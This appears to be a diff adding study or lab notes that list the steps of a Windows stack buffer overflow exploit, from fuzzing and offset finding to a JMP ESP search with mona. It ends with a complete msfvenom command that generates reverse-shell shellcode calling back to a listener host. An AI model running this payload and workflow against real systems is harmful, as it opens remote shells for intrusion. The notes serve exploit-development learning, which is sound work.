@@ -1,0 +1,16 @@
+1: Fuzz the target (Completed)Phase 
+  //creat a random pattern using of msf-creat_pattern\\
+  
+2: Find the exact offset (Completed — 515 bytes)Phase 
+  //get exact offset using msf-creat_offset\\
+
+3: Verify control over EIP (Current Phase)Phase 
+4: Identify bad charactersPhase 
+5: Find a redirection pointer (JMP ESP)Phase 
+  //use of command ** !mona find -s "\xff\xe4" -m ----.exe 
+
+6: Generate shellcode and execute
+  // for generating the shell code use msfvenom example-:
+  
+   msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.27 LPORT=4444 -b "\x00" -f python -v shellcode
+
